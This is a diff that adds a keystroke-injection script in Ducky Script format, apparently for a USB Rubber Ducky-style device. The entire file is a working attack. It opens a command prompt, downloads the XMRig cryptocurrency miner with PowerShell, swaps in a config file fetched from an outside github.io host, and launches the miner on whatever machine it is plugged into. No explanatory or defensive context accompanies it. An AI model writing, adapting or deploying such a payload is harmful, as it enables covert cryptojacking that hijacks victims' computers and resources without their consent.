@@ -1,0 +1,34 @@
+DELAY 1000
+GUI r
+DELAY 2000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING call powershell -command "Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-msvc-win64.zip -OutFile ~/win.zip"
+DELAY 5000
+CTRL w
+ENTER
+DELAY 500
+STRING call powershell -command "Expand-Archive win.zip"
+DELAY 1000
+ENTER
+DELAY 1000
+STRING cd win
+DELAY 500
+ENTER
+STRING cd xmrig-6.17.0
+DELAY 500
+ENTER
+DELAY 300
+STRING del /f config.json
+DELAY 500
+ENTER
+DELAY 1000
+STRING call powershell -command "Invoke-WebRequest https://yeh-john.github.io/xmrig/config.json -OutFile ~/win/xmrig-6.17.0/config.json"
+DELAY 1000
+ENTER
+DELAY 1000
+STRING xmrig.exe
+DELAY 500
+ENTER
